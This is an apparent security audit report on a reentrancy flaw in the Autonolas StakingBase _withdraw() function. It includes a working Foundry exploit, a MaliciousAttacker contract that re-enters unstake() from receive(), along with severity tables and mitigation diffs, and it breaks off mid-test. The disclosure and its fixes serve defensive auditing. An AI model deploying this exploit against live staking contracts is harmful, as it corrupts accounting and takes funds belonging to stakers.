    "body": "## Finding description and impact\n\nA missing reentrancy guard in `_withdraw()` will cause **balance accounting corruption** for **the staking contract and all future stakers** as **a malicious service owner** will **re-enter during ETH transfer to unstake multiple services, causing only one balance decrement to persist while extracting rewards for all services**.\n\n| Category | Details |\n| :--- | :--- |\n| **Impact** | Protocol Insolvency / Permanent State Corruption |\n| **Vector** | Reentrancy via ETH transfer callback during `unstake()` |\n| **File** | [contracts/staking/StakingBase.sol](https://github.com/valory-xyz/autonolas-registries/blob/be1057a5e37f17f26b13c41311fe0e8e40259484/contracts/staking/StakingBase.sol#L929-L948) (Lines 929-947) |\n| **PoC File** | `test/StakingBaseReentrancyPOC.t.sol` |\n\nA malicious, unprivileged external attacker can corrupt the protocol's balance accounting by exploiting a reentrancy vulnerability in [StakingBase::_withdraw()](https://github.com/valory-xyz/autonolas-registries/blob/be1057a5e37f17f26b13c41311fe0e8e40259484/contracts/staking/StakingBase.sol#L929-L948). The vulnerability allows the attacker to break the core accounting invariant `balance == address(this).balance`, resulting in the contract becoming insolvent.\n\n**This is not:** A complex multi-step attack requiring privileged access or external dependencies.  \n**This is:** A single-transaction reentrancy that corrupts fundamental accounting state.\n\n---\n\n> An unprivileged attacker owning two staked services can call `unstake()` and re-enter during the ETH transfer callback to unstake a second service, causing the `balance` state variable to be decremented only once while ETH is transferred twice.\n\n**Proof:** `PoC L#425-428`:\n```solidity\nassertGt(balanceAfter, actualEthAfter, \"VULN: Recorded balance > Actual ETH\");\nassertGt(ethSentOut, balanceDecremented, \"VULN: ETH sent > balance decremented\");\n```\n\n---\n\n## Violated Core Invariant\n\n> **\"Contract balance state variable MUST equal actual ETH held by the contract\"**  \n> `balance == address(stakingContract).balance`\n\n**Evidence:** PoC demonstrates post-attack state where:\n- `balance` (storage) = 99,857 mETH\n- `address(this).balance` (actual) = 99,714 mETH\n- **Invariant broken by 142 mETH**\n\n**PoC L#416-417:**\n```solidity\nconsole2.log(\"POST-ATTACK: balance(storage)=%s mETH | actualETH=%s mETH\", balanceAfter / 1e15, actualEthAfter / 1e15);\nconsole2.log(\"DISCREPANCY: %s mETH (CONTRACT INSOLVENT)\", (balanceAfter - actualEthAfter) / 1e15);\n```\n\n## Impact\n\nThe **staking contract and all future stakers** suffer permanent insolvency. The attacker gains the accounting discrepancy (142 mETH demonstrated), which represents rewards that should have been tracked but weren't.\n\n| Impact Type | Description | Evidence |\n|-------------|-------------|----------|\n| **Direct Loss** | Contract believes it has more ETH than it actually holds | `balance > actualETH` post-attack |\n| **Cascading Effect** | Future reward calculations based on inflated `balance` | `availableRewards` derives from `balance` |\n| **Permanent** | No recovery mechanism; requires contract migration | State permanently corrupted |\n\n### Attack Economics\n\n| Metric | Value | PoC Proof |\n|--------|-------|-----------|\n| **Attacker Cost** | ~0.01 ETH (gas for `executeAttack()`) | Gas for single external call |\n| **Attacker Profit** | 285 mETH extracted |  |\n| **Protocol Loss** | 142 mETH accounting corruption |  |\n| **Repeatable?** | Yes, with each new service pair staked | Attacker can deploy new services |\n\n### Severity Justification Matrix\n\n| Criterion | Required for High | This Vulnerability | PoC Proof |\n|-----------|-------------------|-------------------|-----------|\n| State corruption | Yes | Balance accounting broken | L#425: `assertGt(balanceAfter, actualEthAfter)` |\n| Protocol insolvency | Yes | Contract holds less than recorded | 142 mETH discrepancy |\n| Permissionless | Yes | No special roles required | `MaliciousAttacker` is plain contract |\n| No external dependencies | Yes | Pure internal accounting bug | No oracle/external protocol needed |\n\n> 🔗 **PoC Reference:** Balance snapshots enforce `ethSentOut > balanceDecremented` at L#425\n\n## Root Cause\n\nIn [StakingBase.sol:929-947](https://github.com/valory-xyz/autonolas-registries/blob/be1057a5e37f17f26b13c41311fe0e8e40259484/contracts/staking/StakingBase.sol#L929-L948), the `_withdraw()` function updates the `balance` state variable **after** all ETH transfers complete, following a vulnerable pattern:\n\n[contracts/staking/StakingBase.sol](https://github.com/valory-xyz/autonolas-registries/blob/be1057a5e37f17f26b13c41311fe0e8e40259484/contracts/staking/StakingBase.sol#L929-L948) (Lines 929-947):\n```solidity\nfunction _withdraw(address[] memory receivers, uint256[] memory amounts) internal virtual {\n    // Get current balance\n    uint256 updatedBalance = balance;  // ← [1] Read balance into memory\n\n    for (uint256 i = 0; i < receivers.length; ++i) {\n        updatedBalance -= amounts[i];\n        _transfer(receivers[i], amounts[i]);  // ← [2] External call BEFORE state update\n    }\n\n    balance = updatedBalance;  // ← [3] Write balance AFTER all transfers\n}\n```\n\n[contracts/staking/StakingNativeToken.sol](https://github.com/valory-xyz/autonolas-registries/blob/be1057a5e37f17f26b13c41311fe0e8e40259484/contracts/staking/StakingNativeToken.sol#L27-L33) (Lines 27-33):\n```solidity\nfunction _transfer(address to, uint256 amount) internal override {\n    (bool success, ) = to.call{value: amount}(\"\");  // ← Triggers receive() callback\n    if (!success) {\n        revert TransferFailed(address(0), address(this), to, amount);\n    }\n}\n```\n\n**No reentrancy guard exists on `unstake()`, `claim()`, or any external function in `StakingBase`.**\n\n### Behavior Comparison\n\n| Expected (per invariant) | Actual (PoC demonstrates) | PoC Proof |\n|--------------------------|---------------------------|-----------|\n| `unstake()` decrements balance by reward amount | Balance decremented once for two unstakes | L#425 |\n| `balance == actualETH` always | `balance > actualETH` after attack | L#423 |\n| Single unstake per transaction | Two unstakes via reentrancy | L#79-89 |\n\n### Attack Execution Flow\n\n```solidity\nunstake(serviceA):\n├── checkpoint()\n├── sInfo = mapServiceInfo[serviceA]\n├── delete mapServiceInfo[serviceA]\n├── _withdraw([attacker], [142 mETH])\n│   ├── updatedBalance = balance (100,000 mETH)\n│   ├── updatedBalance = 100,000 - 142 = 99,858 mETH\n│   ├── _transfer(attacker, 142 mETH)\n│   │   └── attacker.receive() {          ← CALLBACK\n│   │       └── unstake(serviceB)         ← REENTER\n│   │           ├── checkpoint()\n│   │           ├── sInfo = mapServiceInfo[serviceB]\n│   │           ├── delete mapServiceInfo[serviceB]\n│   │           ├── _withdraw([attacker], [142 mETH])\n│   │           │   ├── updatedBalance2 = balance (STILL 100,000!)\n│   │           │   ├── updatedBalance2 = 100,000 - 142 = 99,858 mETH\n│   │           │   ├── _transfer(attacker, 142 mETH)\n│   │           │   └── balance = 99,858 mETH   ← First write\n│   │           └── return\n│   │       }\n│   └── balance = 99,858 mETH   ← Second write OVERWRITES first\n└── return\n\nRESULT:\n- 285 mETH transferred out (142 + 142)\n- balance only decremented by 142 mETH\n- Contract is INSOLVENT by 142 mETH\n```\n\n### Distinction from Related Vectors\n\n| Possible Misclassification | Technical Rationale | PoC Evidence |\n|----------------------------|---------------------|--------------|\n| \"Classic single-contract reentrancy\" | Cross-service attack using two distinct service IDs | L#79-89: `unstake(serviceB)` during `serviceA` callback |\n| \"Read-only reentrancy\" | State is actively corrupted, not just read | `balance` write collision proven |\n| \"Governance attack\" | No privileges required | Attacker is plain contract |\n\n## Recommended mitigation steps\n\n### Primary Fix: Add Reentrancy Guard\n\n```diff\n+ import {ReentrancyGuard} from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\n- contract StakingBase {\n+ contract StakingBase is ReentrancyGuard {\n\n-   function unstake(uint256 serviceId) external returns (uint256) {\n+   function unstake(uint256 serviceId) external nonReentrant returns (uint256) {\n        return _unstake(serviceId, false);\n    }\n\n-   function claim(uint256 serviceId) external returns (uint256) {\n+   function claim(uint256 serviceId) external nonReentrant returns (uint256) {\n        return _claim(serviceId, true);\n    }\n```\n\n### Alternative: Checks-Effects-Interactions Pattern\n\n```diff\nfunction _withdraw(address[] memory receivers, uint256[] memory amounts) internal virtual {\n    uint256 updatedBalance = balance;\n+   uint256 totalAmount;\n    \n    for (uint256 i = 0; i < receivers.length; ++i) {\n        updatedBalance -= amounts[i];\n+       totalAmount += amounts[i];\n-       _transfer(receivers[i], amounts[i]);\n        emit Withdraw(receivers[i], amounts[i]);\n    }\n    \n+   // Update state BEFORE external calls\n+   balance = updatedBalance;\n    \n+   // External calls AFTER state updates\n+   for (uint256 i = 0; i < receivers.length; ++i) {\n+       _transfer(receivers[i], amounts[i]);\n+   }\n-   balance = updatedBalance;\n}\n```",
    "proof_of_concept": "### What The PoC Proves\n\n1. ✅ Attacker starts as **unprivileged contract** owning services\n2. ✅ Protocol holds **real ETH** (100 ETH staking rewards)\n3. ✅ After exploit: `balance > actualETH` (invariant violation)\n4. ✅ Single transaction triggers the reentrancy\n\n### Key PoC Code Anchors\n\n**Reentrancy Hook** `L#79-89`:\n```solidity\nreceive() external payable {\n    totalReceived += msg.value;\n    emit ReentrancyTriggered(attackPhase, msg.value);\n    \n    if (attacking && attackPhase == 0) {\n        attackPhase = 1;\n        // Re-enter and unstake service B while service A's unstake is still in progress\n        // At this point, stakingContract.balance is NOT yet updated for serviceA\n        stakingContract.unstake(serviceB);\n    }\n}\n```\n\n**Attack Trigger** `L#397-399`:\n```solidity\nattacker.setTargetServices(serviceIdA, serviceIdB);\nvm.prank(address(attacker));\nattacker.executeAttack();\n```\n### Run\n\n```bash\nforge test --match-contract StakingBaseReentrancyPOC -vv\n```\n---\n```solidity\n// test/StakingBaseReentrancyPOC.t.sol\n// ---\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\n// ============================================================================\n// STAKING BASE REENTRANCY PROOF OF CONCEPT\n// ============================================================================\n// Vulnerability: Cross-Service Reentrancy in StakingBase._withdraw\n// Impact: Balance accounting corruption leading to contract insolvency\n// ============================================================================\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {IService} from \"../contracts/interfaces/IService.sol\";\nimport \"@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol\";\nimport {GnosisSafeProxy} from \"@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol\";\nimport {GnosisSafeProxyFactory} from \"@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol\";\nimport {GnosisSafeMultisig} from \"../contracts/multisigs/GnosisSafeMultisig.sol\";\nimport {ServiceRegistryL2} from \"../contracts/ServiceRegistryL2.sol\";\nimport {ServiceRegistryTokenUtility} from \"../contracts/ServiceRegistryTokenUtility.sol\";\nimport {OperatorWhitelist} from \"../contracts/utils/OperatorWhitelist.sol\";\nimport {ServiceManager} from \"../contracts/ServiceManager.sol\";\nimport {ServiceManagerProxy} from \"../contracts/ServiceManagerProxy.sol\";\nimport \"../contracts/staking/StakingNativeToken.sol\";\nimport {StakingFactory} from \"../contracts/staking/StakingFactory.sol\";\nimport {StakingActivityChecker} from \"../contracts/staking/StakingActivityChecker.sol\";\nimport {ServiceInfo} from \"../contracts/staking/StakingBase.sol\";\nimport {Utils} from \"./utils/Utils.sol\";\n\n// ============================================================================\n// MALICIOUS ATTACKER CONTRACT\n// ============================================================================\n// This contract exploits the reentrancy vulnerability by:\n// 1. Owning two services staked with RewardDistributionType.ServiceOwner\n// 2. When unstaking serviceA, it receives ETH and re-enters to unstake serviceB\n// 3. Both balance decrements use stale state, corrupting accounting\n// ============================================================================\n\ncontract MaliciousAttacker {\n    StakingNativeToken public stakingContract;\n    IService public serviceRegistry;\n    \n    uint256 public serviceA;\n    uint256 public serviceB;\n    bool public attacking;\n    uint256 public attackPhase;\n    uint256 public totalReceived;\n    \n    // Debug events\n    event AttackStarted(uint256 serviceA, uint256 serviceB);\n    event ReentrancyTriggered(uint256 phase, uint256 received);\n    event AttackCompleted(uint256 totalReceived);\n\n    constructor(address _stakingContract, address _serviceRegistry) {\n        stakingContract = StakingNativeToken(payable(_stakingContract));\n        serviceRegistry = IService(_serviceRegistry);\n    }\n\n    function setTargetServices(uint256 _serviceA, uint256 _serviceB) external {\n        serviceA = _serviceA;\n        serviceB = _serviceB;\n    }\n\n    function executeAttack() external returns (uint256) {\n        attacking = true;\n        attackPhase = 0;\n        totalReceived = 0;\n        \n        emit AttackStarted(serviceA, serviceB);\n        \n        // Start unstaking service A - this will trigger the reentrancy\n        stakingContract.unstake(serviceA);\n        \n        attacking = false;\n        \n        emit AttackCompleted(totalReceived);\n        return totalReceived;\n    }\n\n    // This is where reentrancy happens\n    receive() external payable {\n        totalReceived += msg.value;\n        emit ReentrancyTriggered(attackPhase, msg.value);\n        \n        if (attacking && attackPhase == 0) {\n            attackPhase = 1;\n            // Re-enter and unstake service B while service A's unstake is still in progress\n            // At this point, stakingContract.balance is NOT yet updated for serviceA\n            stakingContract.unstake(serviceB);\n        }\n    }\n\n    // Required for receiving service NFTs\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes calldata\n    ) external pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n\n// ============================================================================\n// PROOF OF CONCEPT TEST\n// ============================================================================\n\ncontract StakingBaseReentrancyPOC is Test {\n    // --- INFRASTRUCTURE ---\n    Utils internal utils;\n    GnosisSafe internal gnosisSafe;\n    GnosisSafeProxy internal gnosisSafeProxy;\n    GnosisSafeProxyFactory internal gnosisSafeProxyFactory;\n    GnosisSafeMultisig internal gnosisSafeMultisig;\n    ServiceRegistryL2 internal serviceRegistry;\n    ServiceRegistryTokenUtility internal serviceRegistryTokenUtility;\n    ServiceManager internal serviceManager;\n    StakingNativeToken internal stakingNativeTokenImpl;\n    StakingNativeToken internal stakingNativeToken;\n    StakingFactory internal stakingFactory;\n    StakingActivityChecker internal stakingActivityChecker;\n    \n    // --- ACTORS ---\n    address payable[] internal users;\n    address internal deployer;\n    address internal operator;\n    MaliciousAttacker internal attacker;\n    \n    // --- SERVICES ---\n    uint256 internal serviceIdA;\n    uint256 internal serviceIdB;\n    address internal agentInstanceA;\n    address internal agentInstanceB;\n    \n    // --- STAKING PARAMETERS ---\n    uint256 internal constant MAX_NUM_SERVICES = 10;\n    uint256 internal constant REWARDS_PER_SECOND = 549768518519; // ~1.5 ETH/month\n    uint256 internal constant MIN_STAKING_DEPOSIT = 10 ether;\n    uint256 internal constant MIN_NUM_STAKING_PERIODS = 3;\n    uint256 internal constant MAX_NUM_INACTIVITY_PERIODS = 3;\n    uint256 internal constant LIVENESS_PERIOD = 1 days;\n    uint256 internal constant TIME_FOR_EMISSIONS = 1 weeks;\n    uint256 internal constant LIVENESS_RATIO = 0.0001 ether;\n    uint256 internal constant NUM_AGENT_INSTANCES = 1;\n    \n    uint96 internal constant REG_BOND = 10 ether;\n    uint256 internal constant REG_DEPOSIT = 10 ether;\n    uint32 internal constant THRESHOLD = 1;\n    \n    bytes32 internal constant UNIT_HASH = 0x9999999999999999999999999999999999999999999999999999999999999999;\n    uint32[] internal agentIds;\n    uint256[] internal emptyArray;\n    bytes internal payload;\n\n    // ========================================================================\n    // SETUP\n    // ========================================================================\n    \n    function setUp() public {\n        // Initialize agent IDs\n        agentIds = new uint32[](1);\n        agentIds[0] = 1;\n        \n        // Create users\n        utils = new Utils();\n        users = utils.createUsers(10);\n        deployer = users[0];\n        operator = users[1];\n        agentInstanceA = users[2];\n        agentInstanceB = users[3];\n        \n        vm.label(deployer, \"Deployer\");\n        vm.label(operator, \"Operator\");\n        vm.label(agentInstanceA, \"AgentInstanceA\");\n        vm.label(agentInstanceB, \"AgentInstanceB\");\n        \n        // Deploy ServiceRegistry infrastructure\n        _deployRegistryInfrastructure();\n        \n        // Deploy Gnosis Safe infrastructure\n        _deployMultisigInfrastructure();\n        \n        // Deploy Staking infrastructure\n        _deployStakingInfrastructure();\n        \n        // Deploy attacker contract\n        attacker = new MaliciousAttacker(\n            address(stakingNativeToken),\n            address(serviceRegistry)\n        );\n        vm.label(address(attacker), \"MaliciousAttacker\");\n        vm.deal(address(attacker), 100 ether);\n        \n        // Create two services owned by the attacker\n        _createAttackerServices();\n        \n    }\n    \n    function _deployRegistryInfrastructure() internal {\n        // Deploy service registry\n        serviceRegistry = new ServiceRegistryL2(\n            \"Service Registry\", \n            \"SERVICE\", \n            \"https://localhost/service/\"\n        );\n        serviceRegistryTokenUtility = new ServiceRegistryTokenUtility(address(serviceRegistry));\n        \n        // Deploy service manager with proxy\n        ServiceManager serviceManagerImpl = new ServiceManager(\n            address(serviceRegistry), \n            address(serviceRegistryTokenUtility)\n        );\n        bytes memory proxyData = abi.encodeWithSelector(serviceManagerImpl.initialize.selector, \"\");\n        ServiceManagerProxy serviceManagerProxy = new ServiceManagerProxy(address(serviceManagerImpl), proxyData);\n        serviceManager = ServiceManager(address(serviceManagerProxy));\n        \n        // Configure managers\n        serviceRegistry.changeManager(address(serviceManager));\n        serviceRegistryTokenUtility.changeManager(address(serviceManager));\n        \n        vm.label(address(serviceRegistry), \"ServiceRegistry\");\n        vm.label(address(serviceManager), \"ServiceManager\");\n    }\n    \n    function _deployMultisigInfrastructure() internal {\n        gnosisSafe = new GnosisSafe();\n        gnosisSafeProxy = new GnosisSafeProxy(address(gnosisSafe));\n        gnosisSafeProxyFactory = new GnosisSafeProxyFactory();\n        gnosisSafeMultisig = new GnosisSafeMultisig(\n            payable(address(gnosisSafe)), \n            address(gnosisSafeProxyFactory)\n        );\n        \n        // Whitelist multisig implementation\n        serviceRegistry.changeMultisigPermission(address(gnosisSafeMultisig), true);\n        \n        vm.label(address(gnosisSafeMultisig), \"GnosisSafeMultisig\");\n    }\n    \n    function _deployStakingInfrastructure() internal {\n        // Get multisig proxy bytecode hash for verification\n        bytes32 multisigProxyHash = keccak256(address(gnosisSafeProxy).code);\n        \n        // Deploy staking activity checker\n        stakingActivityChecker = new StakingActivityChecker(LIVENESS_RATIO);\n        \n        // Deploy staking factory\n        stakingFactory = new StakingFactory(address(0));\n        \n        // Prepare staking parameters\n        StakingBase.StakingParams memory stakingParams = StakingBase.StakingParams({\n            metadataHash: bytes32(uint256(uint160(address(msg.sender)))),\n            maxNumServices: MAX_NUM_SERVICES,\n            rewardsPerSecond: REWARDS_PER_SECOND,\n            minStakingDeposit: MIN_STAKING_DEPOSIT,\n            minNumStakingPeriods: MIN_NUM_STAKING_PERIODS,\n            maxNumInactivityPeriods: MAX_NUM_INACTIVITY_PERIODS,\n            livenessPeriod: LIVENESS_PERIOD,\n            timeForEmissions: TIME_FOR_EMISSIONS,\n            numAgentInstances: NUM_AGENT_INSTANCES,\n            agentIds: emptyArray,\n            threshold: 0,\n            configHash: bytes32(0),\n            proxyHash: multisigProxyHash,\n            serviceRegistry: address(serviceRegistry),\n            activityChecker: address(stakingActivityChecker)\n        });\n        \n        // Deploy staking implementation\n        stakingNativeTokenImpl = new StakingNativeToken();\n        \n        // Create staking instance via factory\n        bytes memory initPayload = abi.encodeWithSelector(\n            stakingNativeTokenImpl.initialize.selector,\n            stakingParams,\n            address(serviceRegistry),\n            multisigProxyHash\n        );\n        stakingNativeToken = StakingNativeToken(payable(\n            stakingFactory.createStakingInstance(address(stakingNativeTokenImpl), initPayload)\n        ));\n        \n        vm.label(address(stakingNativeToken), \"StakingNativeToken\");\n        vm.label(address(stakingActivityChecker), \"StakingActivityChecker\");\n    }\n    \n    function _createAttackerServices() internal {\n        IService.AgentParams[] memory agentParams = new IService.AgentParams[](1);\n        agentParams[0].slots = 1;\n        agentParams[0].bond = REG_BOND;\n        \n        // Service A - owned by attacker\n        serviceManager.create(\n            address(attacker), \n            serviceManager.ETH_TOKEN_ADDRESS(), \n            UNIT_HASH, \n            agentIds,\n            agentParams, \n            THRESHOLD\n        );\n        serviceIdA = 1;\n        \n        // Service B - owned by attacker\n        serviceManager.create(\n            address(attacker), \n            serviceManager.ETH_TOKEN_ADDRESS(), \n            UNIT_HASH, \n            agentIds,\n            agentParams, \n            THRESHOLD\n        );\n        serviceIdB = 2;\n        \n        // Activate and deploy Service A\n        vm.prank(address(attacker));\n        serviceManager.activateRegistration{value: REG_DEPOSIT}(serviceIdA);\n        \n        address[] memory agentInstancesA = new address[](1);\n        agentInstancesA[0] = agentInstanceA;\n        vm.prank(operator);\n        serviceManager.registerAgents{value: REG_BOND}(serviceIdA, agentInstancesA, agentIds);\n        \n        vm.prank(address(attacker));\n        serviceManager.deploy(serviceIdA, address(gnosisSafeMultisig), payload);\n        \n        // Activate and deploy Service B\n        vm.prank(address(attacker));\n        serviceManager.activateRegistration{value: REG_DEPOSIT}(serviceIdB);\n        \n        address[] memory agentInstancesB = new address[](1);\n        agentInstancesB[0] = agentInstanceB;\n        vm.prank(operator);\n        serviceManager.registerAgents{value: REG_BOND}(serviceIdB, agentInstancesB, agentIds);\n        \n        vm.prank(address(attacker));\n        serviceManager.deploy(serviceIdB, address(gnosisSafeMultisig), payload);\n    }\n\n    // ========================================================================\n    // EXPLOIT TEST\n    // ========================================================================\n    \n    function testExploit_BalanceCorruptionViaReentrancy() public {\n        // ============================\n        // STEP 1: Fund staking contract\n        // ============================\n        uint256 initialStakingFunds = 100 ether;\n        (bool sent,) = address(stakingNativeToken).call{value: initialStakingFunds}(\"\");\n        require(sent, \"Failed to fund staking contract\");\n        \n        // ============================\n        // STEP 2: Stake both services with ServiceOwner distribution\n        // ============================\n        vm.startPrank(address(attacker));\n        serviceRegistry.approve(address(stakingNativeToken), serviceIdA);\n        serviceRegistry.approve(address(stakingNativeToken), serviceIdB);\n        \n        // RewardDistributionType.ServiceOwner (value = 1) - rewards go to attacker contract\n        uint256 rewardDistributionInfo = 1